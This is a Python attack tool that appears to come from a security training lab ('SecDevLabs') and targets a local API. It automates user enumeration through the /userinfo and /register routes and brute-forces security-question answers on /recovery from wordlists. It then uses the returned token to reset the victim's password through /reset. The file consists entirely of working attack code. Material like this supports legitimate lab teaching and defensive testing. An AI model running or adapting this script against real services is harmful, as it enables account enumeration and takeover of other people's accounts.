import copy
import requests
import sys

QUESTIONS = [
    "How old are you?",
    "What is your birthday?",
    "What is your favorite soccer team?",
    "What is the brand of your first car?"
]
ATTACKS = {
    '1': {
        'urls': {
            'register': 'http://api:3000/register', 
            'userinfo': 'http://api:3000/userinfo',
        },
        'success_code': {
            'register': 400,
            'userinfo': 200
        },
        'contents': {
            'register': {
                "login": "", 
                "password": "a", 
                "firstQuestion": QUESTIONS[1], 
                "firstAnswer": "a", 
                "secondQuestion": QUESTIONS[0], 
                "secondAnswer": "a"
            },
            'userinfo':{
                "login": ""
            }
        },
        'vector': {
            'register': 'login',
            'userinfo': 'login'
        },
        'wordlist': 'wordlists/users.txt'
    },
    '2': {
        'urls': {
            'recovery': 'http://api:3000/recovery', 
            'userinfo': 'http://api:3000/userinfo',
            'reset': 'http://api:3000/reset'
        },
        'contents': {
            'recovery': {
                "login": "", 
                "firstAnswer": "", 
                "secondAnswer": ""
            },
            'userinfo': {
                "login": ""
            }
        },
        'wordlist': {
            QUESTIONS[0]: "wordlists/answers_age.txt",
            QUESTIONS[1]: "wordlists/answers_birthdate.txt",
            QUESTIONS[2]: "wordlists/answers_car.txt",
            QUESTIONS[3]: "wordlists/answers_team.txt"
        }
    }
}

class Colors:
    OKGREEN = '\033[32m'
    FAIL = '\033[31m'
    YELLOW = '\033[33m'
    NORMAL = '\033[0m'
    PISCA = '\033[5;30m'
    BLUE = '\033[0;34m'
    BOLD = '\033[1m'
    NOBOLD = '\033[22m'

def enumerate(atk, rota):
    with open(ATTACKS[atk]["wordlist"], 'r', encoding='utf-8') as wordlist:
        count_users = [0, 0]
        success_code = ATTACKS[atk]["success_code"][rota]
        url = ATTACKS[atk]["urls"][rota]
        c = copy.deepcopy(ATTACKS[atk]["contents"][rota])
        v = ATTACKS[atk]["vector"][rota]
        for line in wordlist:
            line = line[:-1]
            c[v] = line
            response = requests.post(url, json = c)
            if response.status_code == success_code:
                print(f"{Colors.OKGREEN}[SUCCESS]: {line}")
                count_users[1] += 1
            else:
                count_users[0] += 1
    print(f"{Colors.OKGREEN}[FINISHED] {count_users[1]} / {count_users[0]+count_users[1]} users were enumerated.")

def brute_force(atk, user):
    if atk == "1":

        # Ataque pela rota /userinfo
        print(f"{Colors.YELLOW}Performing attack in {Colors.NORMAL}/userinfo{Colors.YELLOW}: ")
        enumerate(atk, "userinfo")

        if input(f"{Colors.YELLOW}Perfom invasive attack in {Colors.NORMAL}/register{Colors.YELLOW} (garbage will be sent to user table)? (Y/N) ").lower() in ("yes", "y", "s", "sim"):
        # Ataque pela rota /register, é invasivo porque registra todas as tentativas como nova conta para descobrir se a conta já existia.
        # Uma solução é deletar a conta após registrar, porém teria q adicionar a opção de deletar dentro da área do usuário.
            enumerate(atk, "register")

    if atk == "2":
        content_one = copy.deepcopy(ATTACKS[atk]["contents"]["userinfo"])
        content_one["login"] = user
        json_response = requests.post(ATTACKS[atk]["urls"]["userinfo"], json = content_one).json()
        try:
            if 'message' in json_response and json_response['message'] == 'invalid login':
                print(f"{Colors.FAIL}[FAIL] User does not exist.")
                return
            if 'firstQuestion' in json_response and 'secondQuestion' in json_response:
                wordlists = [ATTACKS[atk]['wordlist'][json_response['firstQuestion']], ATTACKS[atk]['wordlist'][json_response['secondQuestion']]]
            else:
                raise Exception
        except:
            print(f"{Colors.FAIL}[FAIL] /userinfo response has changed.")
            return

        with open(wordlists[0], "r", encoding='utf-8') as w0, open(wordlists[1], "r", encoding='utf-8') as w1:
            content = copy.deepcopy(ATTACKS[atk]['contents']['recovery'])
            content["login"] = user
            url = ATTACKS[atk]["urls"]["recovery"]
            count=0

            for a0 in w0:
                for a1 in w1:
                    count+=1
                    content["firstAnswer"] = a0[:-1]
                    content["secondAnswer"] = a1[:-1]
                    response = requests.post(url, json = content)
                    print(f"Testados: {count}", end='\r')
                    if response.status_code == 200:
                        print(f"{Colors.OKGREEN}[SUCCESS]{Colors.NORMAL} Token: {response.json()['token']}")
                        new_password = input(f"{Colors.YELLOW}Insert new password: {Colors.YELLOW}")
                        r = requests.post(ATTACKS[atk]["urls"]["reset"], json = {"password": new_password, "repeatPassword": new_password}, headers={'Authorization': f"Bearer {response.json()['token']}"}).json()
                        if "message" in r and r["message"] == "success":
                            print(f"{Colors.OKGREEN}[SUCCESS]{Colors.NORMAL} Password changed.")
                            return
                        else:
                            print(f"{Colors.FAIL}[FAIL] Error changing password.")
                            return
                w1.seek(0)

            print(f"{Colors.FAIL}[FAIL] Answers not found.")
        return

def restart():
    if input(f"\n{Colors.YELLOW}Restart script? (Y/N) ").lower() in ("yes", "y", "s", "sim"):
        run()
    else:
        sys.exit(0)

def set_attack(bold):
    options = "(1, 2): "
    if bold:
        options = f"{Colors.BOLD}(1, 2){Colors.NOBOLD}: "
    atk = input(f"{Colors.YELLOW}Choose the attack {options}")
    if atk not in ("1", "2"):
        atk = set_attack(True)
    return atk

def run():
    try:
        print(f"""{Colors.YELLOW}
     _____           _____             _           _         
    / ____|         |  __ \           | |         | |        
   | (___   ___  ___| |  | | _____   _| |     __ _| |__  ___ 
    \___ \ / _ \/ __| |  | |/ _ \ \ / / |    / _` | '_ \/ __|
    ____) |  __/ (__| |__| |  __/\ V /| |___| (_| | |_) \__ `
   |_____/ \___|\___|_____/ \___| \_/ |______\__,_|_.__/|___/                                                             
    Attacks:
        1- User Enumeration
        2- Brute-force Password Recovery
        """)

        user = None
        atk = set_attack(False)
        if atk == "2":
            user = input(f"User login (ex: {Colors.NORMAL}admin{Colors.YELLOW}): ")

        brute_force(atk, user)
        restart()
    except KeyboardInterrupt:
        try:
            restart()
        except KeyboardInterrupt:
            sys.exit(0)

if __name__ == '__main__':
    run()